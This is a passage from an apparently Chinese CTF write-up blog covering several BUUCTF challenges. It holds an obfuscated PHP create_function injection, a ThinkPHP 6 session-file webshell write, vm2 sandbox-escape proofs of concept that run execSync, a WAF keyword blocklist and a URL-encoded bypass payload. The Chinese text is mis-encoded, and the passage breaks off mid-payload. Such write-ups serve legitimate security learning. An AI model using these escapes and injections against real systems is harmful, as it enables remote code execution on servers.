class="n">a</span><span class="o">%</span><span class="mi">8</span><span class="n">c</span><span class="o">%</span><span class="mi">90</span><span class="o">%</span><span class="mi">8</span><span class="n">a</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">c</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="n">c2</span><span class="o">%</span><span class="mi">8</span><span class="n">d</span><span class="o">%</span><span class="mi">9</span><span class="n">a</span><span class="o">%</span><span class="mi">9</span><span class="n">e</span><span class="o">%</span><span class="n">ce</span><span class="o">%</span><span class="mi">99</span><span class="o">%</span><span class="mi">93</span><span class="o">%</span><span class="n">cb</span><span class="o">%</span><span class="mi">98</span><span class="o">%</span><span class="n">d1</span><span class="o">%</span><span class="mi">8</span><span class="n">f</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="mi">8</span><span class="n">f</span><span class="p">));</span><span class="o">//&amp;%</span><span class="mi">66</span><span class="o">%</span><span class="mi">6</span><span class="n">c</span><span class="o">%</span><span class="mi">61</span><span class="o">%</span><span class="mi">67</span><span class="p">[</span><span class="o">%</span><span class="mi">63</span><span class="o">%</span><span class="mi">6</span><span class="n">f</span><span class="o">%</span><span class="mi">64</span><span class="o">%</span><span class="mi">65</span><span class="p">]</span><span class="o">=</span><span class="n">create_function</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">POST</span>
</span></span><span class="line"><span class="cl"><span class="n">debu</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">file</span><span class="o">=</span><span class="mi">1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="gyctf2020easythinking">[GYCTF2020]EasyThinking
</h2><p>Âà©Áî®thinkphp6.0ÂæÄsessionËøõË°å‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•ÁöÑÊºèÊ¥û</p>
<p>ÊûÑÈÄ†PHPSESSIDÁöÑÂÄºÔºåÊîπÂÄº<strong>ÈïøÂ∫¶‰∏∫32</strong>‰∏î‰∏∫stringÂûãÔºåÁÑ∂ÂêéÂ∞±‰ºöÂú®/runtime/session/ÁõÆÂΩï‰∏ã‰∫ßÁîü‰∏Ä‰∏™phpÊñá‰ª∂</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405201547619.png"
	width="925"
	height="692"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405201547619_hu14284129253457604317.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250405201547619_hu14824927213479857781.png 1024w"
	loading="lazy"
	
		alt="image-20250405201547619"
	
	
		class="gallery-image" 
		data-flex-grow="133"
		data-flex-basis="320px"
	
></p>
<p>ÁÑ∂ÂêéËÆøÈóÆ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/runtime/session/sess_1111111111111111111111111111.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËöÅÂâëËøûÊé•ÔºåÊèí‰ª∂ÁªïËøá</p>
<h2 id="gxyctf2019strongestmind">[GXYCTF2019]StrongestMind
</h2><p>Áà¨Ëô´</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://8131dc42-f253-4d5f-b190-58956c615ca6.node5.buuoj.cn:81/&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">req</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1010</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&#34;\&lt;br\&gt;\&lt;br\&gt;(\d.*?)\&lt;br\&gt;\&lt;br\&gt;&#34;</span><span class="p">,</span><span class="n">req</span><span class="p">)</span><span class="c1">#Ëé∑Âèñ[Êï∞Â≠ó]</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">result</span><span class="p">)</span><span class="c1">#ÊèêÂèñÂ≠óÁ¨¶‰∏≤</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">result</span><span class="p">)</span><span class="c1">#ËøêÁÆó</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;time: &#34;</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span><span class="s2">&#34;   &#34;</span><span class="o">+</span><span class="s2">&#34;result: &#34;</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;answer&#34;</span><span class="p">:</span><span class="n">result</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">req</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;flag{&#34;</span> <span class="ow">in</span> <span class="n">req</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;flag{.*}&#34;</span><span class="p">,</span> <span class="n">req</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">)[:</span><span class="mi">50</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span><span class="c1">#Èò≤Ê≠¢ËÆøÈóÆÂ§™Âø´Êñ≠ÂºÄËøûÊé•</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-]&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="hfctf2020justescape">[HFCTF2020]JustEscape
</h2><p>ÊâìÂºÄÁïåÈù¢Êúârun.php</p>
<p>‰∏ãÈù¢ÂèàËØ¥ÁúüÁöÑÊòØphpÂêó</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="nx">array_key_exists</span><span class="p">(</span> <span class="s2">&#34;code&#34;</span><span class="p">,</span> <span class="nv">$_GET</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;code&#39;</span> <span class="p">]</span> <span class="o">!=</span> <span class="k">NULL</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$code</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="k">eval</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ËÄÉËôëÂà∞evalÂáΩÊï∞‰∏çÊ≠¢phpÊúâÔºånodejs‰πüÊúâ</p>
<p>Áî®<code>Error().stack</code>ÁúãÊä•Èîô‰ø°ÊÅØ</p>
<p><a class="link" href="https://www.bookstack.cn/read/node-in-debugging/3.3ErrorStack.md"  target="_blank" rel="noopener"
    >‰ª£Á†ÅÁØá - Error Stack - „ÄäNode.js Ë∞ÉËØïÊåáÂçó„Äã - ‰π¶Ê†àÁΩë ¬∑ BookStack</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">run.php?code=Error().stack
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nb">Error</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="nx">Script</span><span class="p">.</span><span class="nx">runInContext</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">131</span><span class="o">:</span><span class="mi">20</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="nx">VM</span><span class="p">.</span><span class="nx">run</span> <span class="p">(</span><span class="err">/app/node_modules/vm2/lib/main.js:219:62)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="o">/</span><span class="nx">app</span><span class="o">/</span><span class="nx">server</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">51</span><span class="o">:</span><span class="mi">33</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="nx">Layer</span><span class="p">.</span><span class="nx">handle</span> <span class="p">[</span><span class="nx">as</span> <span class="nx">handle_request</span><span class="p">]</span> <span class="p">(</span><span class="err">/app/node_modules/express/lib/router/layer.js:95:5)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="nx">next</span> <span class="p">(</span><span class="err">/app/node_modules/express/lib/router/route.js:137:13)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="nx">Route</span><span class="p">.</span><span class="nx">dispatch</span> <span class="p">(</span><span class="err">/app/node_modules/express/lib/router/route.js:112:3)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="nx">Layer</span><span class="p">.</span><span class="nx">handle</span> <span class="p">[</span><span class="nx">as</span> <span class="nx">handle_request</span><span class="p">]</span> <span class="p">(</span><span class="err">/app/node_modules/express/lib/router/layer.js:95:5)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="o">/</span><span class="nx">app</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">express</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">router</span><span class="o">/</span><span class="nx">index</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">281</span><span class="o">:</span><span class="mi">22</span>
</span></span><span class="line"><span class="cl">    <span class="nx">at</span> <span class="nb">Function</span><span class="p">.</span><span class="nx">process_params</span> <span class="p">(</span><span class="err">/app/node_modules/express/lib/router/index.js:335:12)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>vmÊ≤ôÁÆ±ÈÄÉÈÄ∏</p>
<p>Áî®githubÊúâÁé∞ÊàêÁöÑpoc</p>
<p><a class="link" href="https://github.com/patriksimek/vm2/issues/225"  target="_blank" rel="noopener"
    >Breakout in v3.8.3 ¬∑ Issue #225 ¬∑ patriksimek/vm2</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">One</span> <span class="nx">can</span> <span class="k">break</span> <span class="nx">out</span> <span class="k">of</span> <span class="nx">the</span> <span class="nx">sandbox</span> <span class="nx">via</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s2">&#34;use strict&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm2&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">untrusted</span> <span class="o">=</span> <span class="s1">&#39;(&#39;</span> <span class="o">+</span> <span class="kd">function</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">	<span class="nx">TypeError</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">get_process</span> <span class="o">=</span> <span class="nx">f</span><span class="p">=&gt;</span><span class="nx">f</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s2">&#34;return process&#34;</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">	<span class="k">try</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Object</span><span class="p">.</span><span class="nx">preventExtensions</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)).</span><span class="nx">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">e</span><span class="p">.</span><span class="nx">get_process</span><span class="p">(()=&gt;{}).</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="o">+</span><span class="s1">&#39;)()&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">new</span> <span class="nx">VM</span><span class="p">().</span><span class="nx">run</span><span class="p">(</span><span class="nx">untrusted</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">x</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">And</span> <span class="nx">another</span> <span class="nx">more</span> <span class="nx">game</span> <span class="nx">breaking</span> <span class="nx">one</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s2">&#34;use strict&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm2&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">untrusted</span> <span class="o">=</span> <span class="s1">&#39;(&#39;</span> <span class="o">+</span> <span class="kd">function</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">	<span class="k">try</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="k">new</span> <span class="nb">Proxy</span><span class="p">({},</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">getOwnPropertyDescriptor</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">				<span class="k">throw</span> <span class="nx">f</span><span class="p">=&gt;</span><span class="nx">f</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s2">&#34;return process&#34;</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="p">}));</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">e</span><span class="p">(()=&gt;{}).</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="o">+</span><span class="s1">&#39;)()&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">new</span> <span class="nx">VM</span><span class="p">().</span><span class="nx">run</span><span class="p">(</span><span class="nx">untrusted</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">x</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Áõ¥Êé•Áî®‰ºöË¢´waf</p>
<p>ËøáÊª§‰∫Ü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">[</span><span class="s1">&#39;for&#39;</span><span class="p">,</span> <span class="s1">&#39;while&#39;</span><span class="p">,</span> <span class="s1">&#39;process&#39;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="s1">&#39;eval&#39;</span><span class="p">,</span> <span class="s1">&#39;constructor&#39;</span><span class="p">,</span> <span class="s1">&#39;prototype&#39;</span><span class="p">,</span> <span class="s1">&#39;Function&#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;&#39;]
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÆòÊñπwpÊòØÂú®ÂÖ≥ÈîÆÂ≠ó‰∏äÁî®‰∏§‰∏™ÂèçÂºïÂè∑ÁªïËøá,ÁÑ∂ÂêéurlÁºñÁ†Å‰∏Ä‰∏ã</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="err">ÊØîÂ¶Ç</span><span class="n">prototypeÂèòÊàê</span><span class="o">`</span><span class="n">p</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">y</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">p</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">f</span><span class="p">.</span><span class="nf">constructor</span><span class="p">(</span><span class="s2">&#34;return process&#34;</span><span class="p">)();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">f</span><span class="p">[[</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">n</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">s</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">u</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">][</span><span class="o">`</span><span class="k">join</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">)]([</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">u</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">n</span><span class="o">`</span><span class="p">,</span><span class="o">`%</span><span class="mi">20</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">p</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">s</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">s</span><span class="o">`</span><span class="p">][</span><span class="o">`</span><span class="k">join</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">))();</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">/</span><span class="n">run</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">code</span><span class="o">=</span><span class="p">(()</span><span class="o">=%</span><span class="mi">3</span><span class="n">E</span><span class="err">{</span><span class="o">%</span><span class="mi">20</span><span class="n">TypeError</span><span class="p">[[</span><span class="o">`</span><span class="n">p</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">y</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">p</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">][</span><span class="o">`</span><span class="k">join</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">)][</span><span class="o">`</span><span class="n">a</span><span class="o">`</span><span class="p">]</span><span class="o">%</span><span class="mi">20</span><span class="o">=%</span><span class="mi">20</span><span class="n">f</span><span class="o">=%</span><span class="mi">3</span><span class="n">Ef</span><span class="p">[[</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">n</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">s</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">u</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">][</span><span class="o">`</span><span class="k">join</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">)]([</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">t</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">u</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">n</span><span class="o">`</span><span class="p">,</span><span class="o">`%</span><span class="mi">20</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">p</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">s</span><span class="o">`</span><span class="p">,</span><span 